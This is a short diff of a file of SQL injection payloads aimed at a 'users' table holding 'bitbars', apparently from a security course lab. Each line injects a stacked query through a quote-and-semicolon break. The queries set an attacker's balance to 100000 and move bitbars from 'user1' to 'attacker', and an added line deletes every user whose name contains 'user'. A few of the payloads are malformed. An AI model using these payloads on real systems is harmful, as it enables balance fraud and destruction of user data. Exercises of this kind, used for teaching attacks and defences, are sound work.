@@ -1,5 +1,7 @@
 '; update users set bitbars=100000 where username = 'attacker';--
 
-'; update users set bitbars-10 where username = 'user1'
-'; update users set bitbars+10 where username = 'attacker'
+'; update users set bitbars-10 where username = 'user1'--
+'; update users set bitbars+10 where username = 'attacker'--
+
+'; delete from users where username like '%user%'
 
